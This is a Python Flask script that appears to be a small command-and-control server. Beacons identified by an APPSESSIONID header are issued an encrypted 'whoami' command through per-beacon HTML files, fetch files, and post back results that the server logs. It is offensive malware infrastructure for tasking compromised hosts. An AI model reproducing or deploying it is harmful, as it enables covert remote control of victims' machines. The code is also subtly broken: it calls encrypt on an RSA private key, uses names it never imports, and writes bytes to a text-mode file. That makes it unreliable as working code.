from flask import *
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

app = Flask(__name__)

with open("private_key.pem", "rb") as key_file:
    private_key = serialization.load_pem_private_key(
        key_file.read(),
        password=None,
        backend=default_backend()
    )

@app.route("/")
def home():
    # Grab the appsessionid value from the headers
    val = request.headers['APPSESSIONID']
    if set(val).difference(ascii_letters + digits):
        # We're not going to bother with input sanatization here
        # If we recieve special characters just drop it entirely
        pass
    else:
        message = b"cmd;whoami;null "
        encrypted = private_key.encrypt(
            message,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        print(f'headers:{val}')
        # create a new page for the UUID we got from the headers
        f = open(f"/var/www/html/{val}.html", "a")
        f.write(encrypted)
        f.close()
        return('found')

@app.route('/<path:filename>', methods=['GET', 'POST'])
def index(filename):
    if request.method == 'GET':
        val = {request.headers['APPSESSIONID']}
        print(f'Host {val} grabbed command')
        return send_from_directory('.', filename)

    return jsonify(request.data)

@app.route("/returned",methods = ['POST'])
def results():
    if request.method == 'POST':
        val = {request.headers['APPSESSIONID']}
        print(f'Result: {request.data} from beacon: {val}')
        return 'HELO'

if __name__=="__main__":
   app.run(debug=True)
